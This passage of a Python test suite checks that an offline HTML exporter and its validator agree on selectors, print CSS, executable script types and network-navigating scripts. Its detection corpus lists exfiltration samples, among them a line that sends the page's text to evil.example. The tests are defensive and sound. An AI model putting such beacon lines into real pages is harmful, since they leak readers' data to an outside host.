                      "the runtime no longer declares CMH_RICH_CONTENT_SEL; the parity check is "
                      "stale and must be re-pointed at whatever replaced it")
        self.assertEqual(
            set(consts["CMH_RICH_CONTENT_SEL"]), set(vendored_libs.RUNTIME_SELECTORS),
            "the runtime's rich-content selectors and vendored_libs.RUNTIME_SELECTORS have "
            "diverged. Update RUNTIME_SELECTORS *and* the detector, or a document using the new "
            "shape will be stripped of a payload its own offline export needs.")

    def test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals(self):
        """The single-definition invariant itself (issue #740).

        Re-typing a selector list inside an offline-usage function is how the exporter and the
        live renderer came to disagree about what a chart is. Fail on any string literal passed
        to querySelector there, so the drift cannot come back.

        `_offlineDocNeedsChartLib` is in the list because it is the function that actually decides
        whether the export inlines Chart.js. It carries the chart-canvas selector a SECOND time,
        and pinning it to the SAME constant as the shape gate is what stops the two from drifting
        apart - a document whose chart one of them recognises and the other does not would lose
        the library its export needs. Functions that scan `script` elements for evidence
        (`_offlineDocReferencesChartLib`) are deliberately NOT in the list: their selector is not
        a content shape.
        """
        source = self._read("68-export-offline.js")
        expected = {
            "_offlineLiveDocNeedsRichLibs": "CMH_RICH_CONTENT_SEL",
            "_offlineDocUsesMermaid": "CMH_MERMAID_SEL",
            "_offlineDocUsesCharts": "CMH_CHART_CANVAS_SEL",
            "_offlineDocNeedsChartLib": "CMH_CHART_CANVAS_SEL",
        }
        for fn, constant in expected.items():
            start = source.find("function " + fn)
            self.assertNotEqual(start, -1,
                                "the runtime no longer defines %s; the parity check is stale "
                                "and must be re-pointed at whatever replaced it" % fn)
            body = source[start:source.find("\n}", start)]
            self.assertTrue(
                re.search(r"querySelector(?:All)?\(\s*" + re.escape(constant) + r"\s*\)", body),
                "%s must query the shared %s constant" % (fn, constant))
            self.assertEqual(
                re.findall(r"querySelector(?:All)?\(\s*[\"'`]", body), [],
                "%s passes a selector literal instead of the shared constant" % fn)

    def test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for(self):
        """Anything the chart renderer draws must be something the export inlines Chart.js for."""
        consts = self._selector_constants()
        renderer = self._read("30-images.js")
        self.assertIn("root.querySelectorAll(CMH_CHART_DATA_SEL)", renderer,
                      "the live chart renderer must select the shared CMH_CHART_DATA_SEL set")
        self.assertTrue(
            set(consts["CMH_CHART_DATA_SEL"]).issubset(set(consts["CMH_CHART_CANVAS_SEL"])),
            "the renderer's chart selectors must be a subset of the exporter's, or a chart can "
            "render live and then export blank")

    def test_no_other_partial_re_types_a_declared_selector_list_verbatim(self):
        """A backstop against the coarsest form of re-typing: copying a declared list wholesale.

        It is deliberately narrow. It does NOT catch a VARIANT of a declared list (the historical
        drift was a variant, not a copy - `canvas.cmh-chart[data-cmh-chart-points], ...` versus
        `figure.chart canvas, canvas.cmh-chart`); component-level matching would fire on the many
        places that legitimately query `pre.mermaid` or `figure.chart` alone for a different
        purpose. The real guarantee against a variant is that the consumers query the constants
        (`test_the_exporter_queries_the_shared_constants_rather_than_its_own_literals` and
        `test_the_live_renderer_draws_a_subset_of_what_the_exporter_provisions_for`); this only
        stops a copy from quietly becoming a second source of truth.
        """
        # Only LISTS are guarded: re-typing an assembled multi-selector list is the drift this
        # exists to catch, while a single token like `figure.chart` is ordinary CSS that other
        # layers legitimately query on its own.
        declared = {", ".join(sel_list) for sel_list in self._selector_constants().values()
                    if len(sel_list) > 1}
        self.assertTrue(declared, "no multi-selector constants declared in 03-selectors.js")
        call_re = re.compile(
            r"(?:querySelectorAll|querySelector|closest|matches)\(\s*[\"'`]([^\"'`]+)[\"'`]")
        js_dir = os.path.join(_paths.DEV, "assets", "js")
        for name in sorted(os.listdir(js_dir)):
            if name == "03-selectors.js" or not name.endswith(".js"):
                continue
            body = self._read(name)
            for used in call_re.findall(body):
                normalized = ", ".join(p.strip() for p in used.split(",") if p.strip())
                self.assertNotIn(
                    normalized, declared,
                    "%s re-types the selector list %r that 03-selectors.js already declares; "
                    "query the shared constant instead" % (name, used))

    def test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant(self):
        """CMH-PRINT-07: the measure CSS must DERIVE its diagram hosts, not re-type them.

        `83-print.js` builds a CSS string it applies under screen media to measure single-page
        height (CMH-PRINT-06). Its tall-media cap has to name the mermaid hosts, and re-typing
        them there is exactly how `div.mermaid` fell out of the cap while `pre.mermaid` kept it:
        the list was written once from memory as `pre.mermaid` alone and then never revisited when
        the runtime learned the second host. Deriving from `CMH_MERMAID_SEL` makes that class of
        drift impossible rather than merely fixed once.

        Three things are asserted, because any one alone is false-greenable: the helper really
        reads the shared constant, `measureCss()` really CONCATENATES the helper's result (a call
        whose value is discarded would leave the cap gone), and no string literal in the file
        re-types a host behind the helper's back. All of it runs on comment-blanked code, so a
        comment naming an identifier cannot stand in for the code that used to use it.
        """
        source = self._read("83-print.js")
        literals, code = self._scan_js(source)
        # `_scan_js` deliberately models strings and comments but NOT regex literals, which also
        # open with "/" and would leave stray braces and quotes in the code stream - silently
        # pointing every check below at the wrong text. Nothing in this partial uses a regex
        # literal (or a division) today, so assert that stays true rather than assuming it.
        self.assertNotIn(
            "/", code,
            "83-print.js now has a '/' outside a string or comment (a regex literal or a "
            "division). _scan_js models neither, so it can no longer be trusted to blank strings "
            "or match braces here; teach it the new construct before relying on this guard.")
        helper = self._function_body(code, "_printMermaidCapSel")
        self.assertIn("CMH_MERMAID_SEL", helper,
                      "_printMermaidCapSel() must build the cap selector from the shared "
                      "CMH_MERMAID_SEL constant declared in 03-selectors.js")
        measure = self._function_body(code, "measureCss")
        self.assertIn("+ _printMermaidCapSel()", measure,
                      "measureCss() must CONCATENATE _printMermaidCapSel() into its selector "
                      "list; a bare call whose result is dropped, or a helper nothing calls at "
                      "all, leaves the measured page uncapped for diagrams")
        for host in self._mermaid_hosts():
            for literal in literals:
                self.assertNotIn(
                    host, literal,
                    "83-print.js re-types the mermaid host %r that 03-selectors.js already "
                    "declares (in the string literal %r); derive it from CMH_MERMAID_SEL instead, "
                    "or the two can drift again" % (host, literal))
            # Splitting a host across two concatenated literals ("#commentRoot pre" + ".mermaid
            # svg,") re-types it just as effectively while defeating a per-literal scan, so check
            # the run of literals as one string too.
            self.assertNotIn(
                host, "".join(literals),
                "83-print.js re-types the mermaid host %r that 03-selectors.js already declares, "
                "split across concatenated string literals; derive it from CMH_MERMAID_SEL "
                "instead" % host)

    def test_the_clip_layer_derives_its_containers_from_the_shared_constant(self):
        """CMH-RESP-02: the clip-container selectors must DERIVE their hosts, not re-type them.

        `_clipContainersFor()` in `20-mermaid.js` resolves the boxes a floating diagram control is
        clamped to. Its container lists have to name the mermaid hosts, and re-typing them there is
        exactly how a standalone `div.mermaid` fell out of the clip layer while `pre.mermaid` kept
        it (issue #769): the list was written once as `pre.mermaid` alone and never revisited when
        the runtime learned the second host. The sibling backstop
        (`test_no_other_partial_re_types_a_declared_selector_list_verbatim`) cannot catch this - it
        only matches a WHOLESALE copy of a declared list, and the historical bug was a VARIANT
        (`pre.mermaid, figure.chart, table, .cmh-diff-raw`), which normalizes to a string that is
        not in `declared` and so passes. This pins the derivation itself, mirroring
        `test_the_print_measure_css_derives_its_mermaid_hosts_from_the_shared_constant` for the
        print surface.

        Three things are asserted, because any one alone is false-greenable: the token list really
        reads the shared constant, both selectors really BUILD from those tokens (a list that
        merely sits beside them is not wired up), and no string literal in the file re-types a
        host behind their back. All of it runs on comment-blanked code, so a comment naming an
        identifier cannot stand in for the code that used to use it.
        """
        source = self._read("20-mermaid.js")
        literals, code = self._scan_js(source)
        self.assertIn(
            "CMH_MERMAID_SEL", code,
            "20-mermaid.js no longer reads the shared CMH_MERMAID_SEL constant; the clip-container "
            "selectors must derive their diagram hosts from 03-selectors.js, not re-type them")
        # The normalized token list is the single seam both selectors build from. Pin that BOTH are
        # built from it: a derived gallery list beside a hand-typed clip list is exactly the
        # half-migrated state issue #769 fixed.
        self.assertRegex(
            code, r"var MERMAID_HOST_TOKENS\s*=[^;]*CMH_MERMAID_SEL",
            "MERMAID_HOST_TOKENS must be built from CMH_MERMAID_SEL, so every clip-container "
            "selector in this partial shares one normalization of the shared vocabulary")
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var %s\s*=[^;]*MERMAID_HOST_TOKENS" % name,
                "%s must be BUILT from MERMAID_HOST_TOKENS; a list that re-types the hosts (or is "
                "assembled some other way) can drift from the vocabulary again" % name)
        # And the resolver has to actually USE them - a derived constant nothing queries leaves the
        # clip layer on whatever literal replaced it. Both vocabularies now meet in ONE walk
        # selector (CMH-RESP-12 intersects the whole chain of clipping ancestors), so pin that seam
        # in both directions: the walk selector is built from both lists, and the resolver queries
        # the walk selector.
        for name in ("GALLERY_CARD_SEL", "CLIP_CONTAINER_SEL"):
            self.assertRegex(
                code, r"var CLIP_CHAIN_SEL\s*=[^;]*%s" % name,
                "CLIP_CHAIN_SEL must be built from %s; a walk selector that re-types either "
                "vocabulary can drift from it again" % name)
        resolver = self._function_body(code, "_clipContainersFor")
        self.assertIn(
            "CLIP_CHAIN_SEL", resolver,
            "_clipContainersFor() must query CLIP_CHAIN_SEL; a derived selector the resolver never "
            "uses does not clip anything")
        for host in self._mermaid_hosts():
            self.assertNotIn(
                host, "".join(literals),
                "20-mermaid.js re-types the mermaid host %r that 03-selectors.js already declares "
                "(including split across concatenated string literals); derive it from "
                "CMH_MERMAID_SEL instead, or the two can drift again" % host)

    def test_the_print_stylesheet_caps_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-07: pin the one surface that CANNOT import the constant.

        `92-print.css` is a plain stylesheet: it has no way to reference a JS constant, so it is
        the one place the mermaid vocabulary is unavoidably spelled out. Pin it two-directionally
        instead, exactly as `vendored_libs.RUNTIME_SELECTORS` is pinned for the Python detector -
        every declared host must be capped, and no OTHER `.mermaid` host may be. Then the printed
        cap (this stylesheet) and the measured cap (`measureCss()`, derived above) can never again
        disagree about what a diagram host is: capping a host in one but not the other either
        prints an oversized diagram or measures a height the print never produces.

        Comments are stripped FIRST. The prose above the rule explains which hosts it caps, so a
        comment could otherwise satisfy this check on its own - delete `div.mermaid svg` from the
        selector, mention it in the comment, and an unstripped scan still passes while the cap is
        gone. That is precisely the silent half-vocabulary regression this test exists to catch.
        """
        css = self._strip_css_comments(self._read_css("92-print.css"))
        blocks = [m for m in re.finditer(r"([^{}]*)\{([^{}]*max-height:\s*8\.4in[^{}]*)\}", css)]
        self.assertEqual(len(blocks), 1,
                         "expected exactly one 8.4in tall-media cap rule in 92-print.css; found "
                         "%d. Re-point this check at whatever replaced it." % len(blocks))
        selector = blocks[0].group(1)
        # An attribute-selector VALUE is not a capped host: `[data-x="div.mermaid svg"]` would
        # otherwise satisfy every check below while the real cap was deleted - the same
        # "text near the rule stands in for the rule" hole the comment stripping above closes.
        selector = re.sub(r"\[[^\]]*\]", "[]", selector)
        # Collect every `<element>.<class> svg` arm the rule caps, WITHOUT hard-coding ".mermaid":
        # a future vocabulary with a different class name must still be checked, not silently
        # skipped. The trailing boundary matters too - `pre.mermaid svgx` is not a cap on the
        # rendered SVG, and a plain substring test would accept it.
        capped = set(re.findall(r"([A-Za-z][\w-]*\.[\w-]+)\s+svg(?![\w-])", selector))
        self.assertEqual(
            capped, set(self._mermaid_hosts()),
            "the print stylesheet's tall-media cap and the shared CMH_MERMAID_SEL vocabulary have "
            "diverged (capped `<host> svg`: %s; declared: %s). A declared host that is NOT capped "
            "prints an unconstrained diagram that overflows the page; a capped host that is no "
            "longer declared is dead CSS. Note the cap must target the rendered `svg` INSIDE the "
            "host, not the host box." % (sorted(capped), sorted(self._mermaid_hosts())))

    def _iter_css_rules(self, css):
        """Yield `(at_rule_preludes, selector, declarations)` for every rule in a stylesheet.

        A plain scan, not a CSS parser: it tracks the stack of enclosing at-rule preludes (so a
        rule's media context is known) and treats a declaration block as brace-free, which holds
        for this project's flat CSS. Feed it COMMENT-STRIPPED text, for the same reason the cap
        pin above strips comments - prose that merely describes a rule must not stand in for it.
        """
        rules, stack, i, start, n = [], [], 0, 0, len(css)
        while i < n:
            ch = css[i]
            if ch == "{":
                prelude = css[start:i].strip()
                if prelude.startswith("@"):
                    stack.append(prelude)
                    i += 1
                    start = i
                    continue
                end = css.find("}", i)
                end = n if end == -1 else end
                rules.append((tuple(stack), prelude, css[i + 1:end]))
                i = end + 1
                start = i
                continue
            if ch == "}":
                if stack:
                    stack.pop()
                i += 1
                start = i
                continue
            i += 1
        return rules

    def test_the_diagram_scroll_fade_mask_is_screen_only_on_exactly_the_shared_mermaid_hosts(self):
        """CMH-PRINT-08: the scroll cue exists in ONE media context, so print cannot inherit it.

        The edge fade tells a reader a wide diagram scrolls horizontally inside its own box. Paper
        does not scroll, so a mask that survives into print only washes out the printed diagram's
        edges. The robust expression is to declare the mask `screen`-only at the source rather than
        to add a second, print-scoped reset: a reset is a SECOND surface that can drift (exactly how
        `div.mermaid` fell out of the tall-media cap while `pre.mermaid` kept it, CMH-PRINT-07), and
        it would also owe a `measureCss()` mirror by the paired-print-surfaces convention.

        Pinned in both directions, across every stylesheet partial: there is exactly ONE such rule,
        it sits inside a screen-only `@media` block, and it covers exactly the shared
        `CMH_MERMAID_SEL` vocabulary - so the mask can neither leak back into print nor fade one
        host shape while leaving the other alone.
        """
        css_dir = os.path.join(_paths.DEV, "assets", "css")
        faded = []
        for name in sorted(os.listdir(css_dir)):
            if not name.endswith(".css"):
                continue
            css = self._strip_css_comments(self._read_css(name))
            for media, selector, decls in self._iter_css_rules(css):
                if "cmh-diagram-scroll-fade" in selector and "mask-image" in decls:
                    faded.append((name, media, selector))
        self.assertEqual(
            len(faded), 1,
            "expected exactly one scroll-fade mask rule across the CSS partials; found %d (%s). A "
            "second one is a second surface that can disagree with the first - which is the drift "
            "this pin exists to prevent. Re-point this check if the rule legitimately moved."
            % (len(faded), [(n, s.strip()) for n, _m, s in faded]))
        name, media, selector = faded[0]
        self.assertTrue(
            any(re.match(r"@media\s+screen\b", prelude) for prelude in media),
            "the scroll-fade mask rule in %s is no longer inside a screen-only @media block (at-rule "
            "context: %s). Outside one it applies in PRINT too, and a wide diagram prints with faded "
            "left and right edges for a scroll that paper cannot do." % (name, list(media)))
        for prelude in media:
            self.assertNotIn(
                "print", prelude,
                "the scroll-fade mask rule in %s sits in an at-rule context that names print (%r); "
                "the cue is for scrolling, which paper does not do." % (name, prelude))
        selector = re.sub(r"\[[^\]]*\]", "[]", selector)
        faded_hosts = set(re.findall(r"([A-Za-z][\w-]*\.[\w-]+)\.cmh-diagram-scroll-fade", selector))
        self.assertEqual(
            faded_hosts, set(self._mermaid_hosts()),
            "the scroll-fade mask rule and the shared CMH_MERMAID_SEL vocabulary have diverged "
            "(faded hosts: %s; declared: %s). A declared host with no fade loses the scroll cue; a "
            "faded host that is no longer declared is dead CSS."
            % (sorted(faded_hosts), sorted(self._mermaid_hosts())))

    def test_every_runtime_selector_is_recognised_by_the_author_time_detector(self):
        markup = {
            "pre.mermaid": '<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>',
            "div.mermaid": '<div class="mermaid">graph TD; A--&gt;B;</div>',
            "figure.chart canvas": '<figure class="chart"><canvas id="a"></canvas></figure>',
            "canvas.cmh-chart": '<canvas class="cmh-chart" id="b"></canvas>',
            "canvas[data-cmh-chart-points]": '<canvas id="c" data-cmh-chart-points="[]"></canvas>',
            "canvas[data-cmh-chart-source]": '<canvas id="d" data-cmh-chart-source="pts"></canvas>',
        }
        self.assertEqual(set(markup), set(vendored_libs.RUNTIME_SELECTORS),
                         "add example markup for every declared runtime selector")
        for selector, fragment in markup.items():
            self.assertTrue(
                vendored_libs.content_needs_rich_libs(_doc("<h1>H</h1>\n" + fragment)),
                "content matching the runtime selector %r must be detected as needing the "
                "libraries" % selector)


    def test_the_python_and_js_runnable_script_type_predicates_agree(self):
        """The offline strips (JS) and the strict validator (Python) must call the SAME script
        types executable.

        They are two independent implementations of the HTML "JavaScript MIME type" set, and a
        drift between them is invisible: the validator would declare an offline file clean while
        the exporter's strips no longer protect it (or the reverse, so the gate rejects a file the
        exporter just produced). That is not hypothetical - the validator's set was the narrow
        five-type one for as long as the strips' was, so `<script type="text/x-javascript">
        import("https://evil/")</script>` passed `validate.py --strict` as offline-clean.

        Two-directional: the corpus mixes every accepted type with inert and near-miss ones
        (`text/javascript1.6` is deliberately NOT a JavaScript MIME type), so this fails whether an
        implementation drops a type or gains one the other does not have.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineIsRunnableScriptType")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _offlineIsRunnableScriptType; the "
                            "parity check is stale and must be re-pointed at whatever replaced it")
        body = source[start:source.find("\n}", start)]
        patterns = re.findall(r"/\^((?:[^/\\]|\\.)*)\$/", body)
        self.assertEqual(len(patterns), 2,
                         "expected exactly 2 anchored type regexes in the runtime predicate, got "
                         "%r - the extraction is stale" % (patterns,))
        runtime_res = [re.compile("^" + p.replace("\\/", "/") + "$") for p in patterns]

        def runtime_says_runnable(raw):
            normalized = str(raw or "").split(";")[0].strip().lower()
            if not normalized or normalized == "module":
                return True
            return any(rx.match(normalized) for rx in runtime_res)

        # The accepted list is written out LITERALLY rather than derived from `_JS_TYPES`: a corpus
        # built from the set under test shrinks with it, so removing a type would silently remove
        # its own coverage and the check would pass. Unioning `_JS_TYPES` on top covers the other
        # direction (a type ADDED to only one implementation).
        accepted = {"", "module", "text/javascript", "application/javascript",
                    "text/x-javascript", "application/x-javascript",
                    "text/ecmascript", "application/ecmascript",
                    "text/x-ecmascript", "application/x-ecmascript",
                    "text/javascript1.0", "text/javascript1.1", "text/javascript1.2",
                    "text/javascript1.3", "text/javascript1.4", "text/javascript1.5",
                    "text/jscript", "text/livescript"}
        corpus = sorted(accepted | set(parsing._JS_TYPES) | {
            # inert: data or transpiler-only, must NOT count as executable on either side
            "text/plain", "application/json", "application/ld+json", "importmap",
            "speculationrules", "text/template", "text/babel", "text/jsx",
            "text/x-handlebars-template", "text/vbscript",
            # near misses and normalization
            "text/javascript1.6", "text/javascript1.", "text/ecmascript6", "javascript",
            "  TEXT/JavaScript  ", "text/javascript; charset=utf-8", "module; x=1",
        })
        for raw in accepted:
            self.assertTrue(runtime_says_runnable(raw),
                            "the runtime predicate no longer runs %r, which the HTML JavaScript "
                            "MIME type set says a browser executes" % raw)
        self.assertEqual(
            accepted, set(parsing._JS_TYPES),
            "the literal accepted-type list in this test and the validator's _JS_TYPES have "
            "diverged. Both are deliberate spellings of the HTML JavaScript MIME type set; move "
            "them together, or the corpus silently stops covering whatever was dropped.")
        for raw in corpus:
            self.assertEqual(
                runtime_says_runnable(raw), parsing._is_executable_js({"type": raw}),
                "the runtime's _offlineIsRunnableScriptType and the validator's _JS_TYPES "
                "disagree about %r. Update BOTH: a type only one of them runs is either an "
                "unstripped executable script the gate blesses, or a false rejection." % raw)


    _NAV_CORPUS_NAVIGATES = [
        'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
        "\nlocation = 'https://evil.example';",
        'window.location.href="//evil.example/beacon";',
        "top.location.replace('https://evil.example')",
        'document.location.assign("https://evil.example")',
        "self.location.href = `https://evil.example`",
        'parent.location.href = "http://evil.example"',
        'globalThis.location.href =\n  "https://evil.example"',
        'window.location = "https://evil.example"',
        'window.open( "//evil.example/popup" )',
        'self.open("https://evil.example")',
        'LOCATION.HREF = "HTTPS://EVIL.EXAMPLE"',
        # A prefix CHAIN, not just one prefix - `window.` in front used to clear the strip.
        'window.top.location.href = "https://evil.example"',
        'window.parent.location.href = "https://evil.example"',
        'self.top.location = "https://evil.example"',
        # Optional chaining, in forms that are VALID JavaScript. (An optional-chain ASSIGNMENT
        # such as `window?.location.href = <url>` is a SyntaxError and navigates nothing, so
        # pinning it would only prove the regex matches dead source.)
        'window?.open("https://evil.example")',
        'location?.assign("https://evil.example")',
        'window.location?.assign("https://evil.example")',
        'window ?. open ( "https://evil.example" )',
        # `frames` (=== window) is a real top-level navigation.
        'frames.location.href = "https://evil.example"',
        # The natural arrow-function beacon, and a bare assignment inside a block.
        'setTimeout(() => location = "https://evil.example/?" + document.body.innerText)',
        'if (x) {\n  location = "https://evil.example";\n}',
        'if (x) location = "https://evil.example";',
        # Shadowing does NOT rescue a PREFIXED sink: `window.location` names the real one no matter
        # what a local `location` shadows, so these must still be stripped.
        'const location = {}; window.location.href = "https://evil.example";',
        'const location = {}; top.location.replace("https://evil.example");',
        'const location = {}; window.open("https://evil.example");',
        # JS treats U+FEFF as whitespace; Python's `\\s` does not, so a shared class let this
        # valid-JS beacon be stripped by the exporter yet certified clean by the validator.
        'location.href =\ufeff"https://evil.example"',
    ]
    # Benign shapes that must SURVIVE. The strip deletes a whole script, so a false positive
    # silently breaks an author's document - the costlier direction of the two.
    _NAV_CORPUS_BENIGN = [
        # Comparisons, not assignments - a document that merely INSPECTS its own URL.
        'if (location.href === "https://evil.example") return;',
        'if (location.href !== "https://evil.example") return;',
        # A network literal and a navigation object in the same script, never joined.
        'var DOCS = "https://docs.example.org/guide"; if (location.hash) document.title = DOCS;',
        # A LOCAL binding that merely happens to be called `location` (a config value, a geocode
        # result). Assigning a URL to it navigates nothing.
        'var location = "https://api.example.com/v1";',
        'const location = "https://docs.example.org/x";',
        'let location = "https://docs.example.org/x";',
        'function f() { var location = "https://evil.example"; return location; }',
        # A local helper called `open` - `open("...")` alone is not the global navigation sink.
        'open("https://docs.example.org/guide")',
        'const open = mk(); open("https://docs.example.org/guide")',
        'xhr.open("GET", "https://evil.example")',
        'myopen("https://evil.example")',
        # Purely LOCAL bindings that merely default to a URL. These navigate nothing, and deleting
        # the whole script over them is the costlier failure direction.
        'function f(location = "https://cdn.example.com/x") { return location; }',
        'const { location = "https://cdn.example.com/x" } = opts;',
        'var a = 1, location = "https://cdn.example.com/x";',
        # Not the top-level document: some other object's `location` (frame-src 'none' blocks
        # frames anyway).
        'frame.location.href = "https://evil.example"',
        'cfg.location.href = "https://evil.example"',
        # A local binding whose name only case-FOLDS to `location` under Python's Unicode rules
        # (the dotless i). JS `/i` does not fold it, so without `re.ASCII` the validator rejected
        # source the exporter preserves. Keeping it in the BENIGN list pins both engines.
        'locat\u0131on.href = "https://evil.example"',
        '\u017felf.location.href = "https://evil.example"',
        # A LOCAL binding named `location` makes an unprefixed sink refer to that object, not the
        # document - `const location = { href: "" }; location.href = <url>` navigates nothing, so
        # deleting the whole script over it is content loss. Shadow-awareness suppresses only the
        # UNPREFIXED sinks; the prefixed cases below still fire.
        'const location = { href: "" }; location.href = "https://api.example";',
        'let location = {}; location.assign("https://api.example");',
        'function f(location) { location.href = "https://api.example"; }',
        'const { location } = opts; location.href = "https://api.example";',
        'try { x(); } catch (location) { location.href = "https://api.example"; }',
        # A relative navigation inside the offline file is not egress.
        'location.href = "#section-2";',
        'location.assign("./other.html")',
    ]

    # The three regex literals the exporter's navigation decision is built from, each paired with
    # the validator constant that must mirror it byte for byte.
    _NAV_PATTERN_NAMES = (
        ("_OFFLINE_NAV_TO_NETWORK_RE", "OFFLINE_NAV_TO_NETWORK_RE"),
        ("_OFFLINE_NAV_PREFIXED_RE", "OFFLINE_NAV_PREFIXED_RE"),
        ("_OFFLINE_LOCAL_LOCATION_RE", "OFFLINE_LOCAL_LOCATION_RE"),
    )

    def _runtime_nav_pattern(self, name="_OFFLINE_NAV_TO_NETWORK_RE"):
        """One of the exporter's navigation regex SOURCES, extracted from the runtime partial."""
        source = self._read("68-export-offline.js")
        m = re.search(r"^const %s = /(.+)/i;$" % re.escape(name), source, re.MULTILINE)
        self.assertIsNotNone(
            m, "the runtime no longer defines %s as a single-line case-insensitive regex literal; "
               "the parity extraction is stale" % name)
        return m.group(1)

    def _runtime_navigates(self, sample):
        """Evaluate the exporter's DECISION in Python, mirroring `_offlineScriptNavigatesToNetwork`.

        The decision is not one regex: a script that declares its own `location` is talking about
        that object, so only the PREFIXED sinks count there. Comparing raw pattern hits would miss
        a drift in that rule, which is the part that decides whether a benign script is deleted.
        """
        full = re.compile(self._runtime_nav_pattern("_OFFLINE_NAV_TO_NETWORK_RE"),
                          re.IGNORECASE | re.ASCII)
        prefixed = re.compile(self._runtime_nav_pattern("_OFFLINE_NAV_PREFIXED_RE"),
                              re.IGNORECASE | re.ASCII)
        shadow = re.compile(self._runtime_nav_pattern("_OFFLINE_LOCAL_LOCATION_RE"),
                            re.IGNORECASE | re.ASCII)
        if not full.search(sample):
            return False
        if shadow.search(sample):
            return bool(prefixed.search(sample))
        return True

    def test_the_python_and_js_scripted_navigation_patterns_agree(self):
        """The offline strip (JS) and the strict validator (Python) must recognize the SAME
        scripted top-level navigations.

        Top-level navigation is the one egress channel the offline CSP cannot close (`navigate-to`
        was dropped from CSP Level 3 and ships nowhere; `sandbox` is ignored in a meta-delivered
        policy), so this pattern is not defense in depth behind a boundary - for that channel it IS
        the check. Two independent copies of it are exactly the drift the runnable-script-type
        parity test above exists for: a validator that recognized less would certify an offline file
        the exporter no longer protects, and one that recognized more would reject the file the
        exporter just produced.

        All THREE literals the decision is built from are pinned by TEXT equality, not by
        re-deriving one from the other. That is the only pin that survives the engines disagreeing:
        `\\w` is ASCII-only in JS but Unicode-aware in Python, and JS whitespace includes U+FEFF
        while Python's does not, so a pattern that merely LOOKS shared can still behave differently.
        Both copies therefore spell those classes out, and
        `test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine` checks the behaviour in
        node.
        """
        for js_name, py_name in self._NAV_PATTERN_NAMES:
            runtime_pattern = self._runtime_nav_pattern(js_name)
            compiled = getattr(resources, py_name)
            self.assertEqual(
                runtime_pattern, compiled.pattern,
                "the exporter's %s literal and the validator's %s pattern text have diverged. They "
                "must be byte-identical (Python reads the JS-only `\\/` escape as a literal `/` "
                "too), because a validator that recognizes less certifies a file the exporter no "
                "longer protects, and one that recognizes more rejects the file the exporter just "
                "produced." % (js_name, py_name))
            # `re.ASCII` is part of the contract, not an implementation detail: without it Python's
            # IGNORECASE folds several non-ASCII letters onto ASCII ones that JS's `/i` does not, so
            # the validator would reject source the exporter preserves.
            self.assertTrue(
                compiled.flags & re.ASCII,
                "the validator's %s must be compiled with re.ASCII, or Python's Unicode "
                "case-folding (dotless i, long s, Kelvin sign) makes it match identifiers the JS "
                "engine - and therefore the exporter - does not" % py_name)
            # Guard the spelled-out classes: re-introducing a shared shorthand silently
            # reintroduces the cross-engine divergence, and text equality alone would not notice.
            # Every ASCII-vs-Unicode shorthand is banned, not just the two that actually bit.
            for shared in (r"\s", r"\S", r"\w", r"\W", r"\d", r"\D", r"\b", r"\B"):
                self.assertNotIn(
                    shared, runtime_pattern,
                    "%s uses %r, whose meaning DIFFERS between the JS and Python regex engines "
                    "(ASCII vs Unicode `\\w`/`\\d`; U+FEFF is JS whitespace but not Python's). "
                    "Spell the class out in both copies instead." % (js_name, shared))

        # Compare the DECISION, not raw pattern hits: the shadow rule (an unprefixed sink in a
        # script that declares its own `location` is that local object, not the document) is the
        # part that decides whether a benign script is deleted, so a drift there must fail here.
        for sample in self._NAV_CORPUS_NAVIGATES:
            self.assertTrue(self._runtime_navigates(sample),
                            "the runtime no longer strips %r" % sample)
            self.assertTrue(resources.offline_script_navigates_to_network(sample),
                            "the validator no longer rejects %r" % sample)
        for sample in self._NAV_CORPUS_BENIGN:
            self.assertFalse(self._runtime_navigates(sample),
                             "the runtime now deletes the benign script %r" % sample)
            self.assertFalse(resources.offline_script_navigates_to_network(sample),
                             "the validator now rejects the benign script %r" % sample)

    def test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine(self):
        """Byte-identical pattern text is necessary but NOT sufficient - run it in node too.

        Compiling the extracted JS source with Python's `re` (which the text-equality test above
        does) can only ever prove what PYTHON does with it; it structurally cannot catch an engine
        difference, which is exactly the class of bug this pattern hit. So evaluate the same corpus
        in the actual JS engine and require identical verdicts. Skipped when node is absent, the
        way the repo's other node-gated checks degrade - CI always has it.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        payload = {
            "full": self._runtime_nav_pattern("_OFFLINE_NAV_TO_NETWORK_RE"),
            "prefixed": self._runtime_nav_pattern("_OFFLINE_NAV_PREFIXED_RE"),
            "shadow": self._runtime_nav_pattern("_OFFLINE_LOCAL_LOCATION_RE"),
            "navigates": self._NAV_CORPUS_NAVIGATES,
            "benign": self._NAV_CORPUS_BENIGN,
        }
        # Mirrors `_offlineScriptNavigatesToNetwork`, so this pins the DECISION (including the
        # shadow rule) in the real engine, not just one pattern's raw hits.
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const full=new RegExp(p.full,'i');const pre=new RegExp(p.prefixed,'i');"
            "const sh=new RegExp(p.shadow,'i');"
            "const decide=s=>full.test(s)?(sh.test(s)?pre.test(s):true):false;"
            "const out={navigates:p.navigates.map(decide),benign:p.benign.map(decide)};"
            "process.stdout.write(JSON.stringify(out));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the navigation pattern: %s" % proc.stderr)
        verdicts = json.loads(proc.stdout)
        # Length-check before zipping: `zip` truncates silently, so a helper that returned a short
        # (or empty) list would let this pass having asserted nothing.
        self.assertEqual(len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES),
                         "node returned %d verdicts for %d navigating samples"
                         % (len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES)))
        self.assertEqual(len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN),
                         "node returned %d verdicts for %d benign samples"
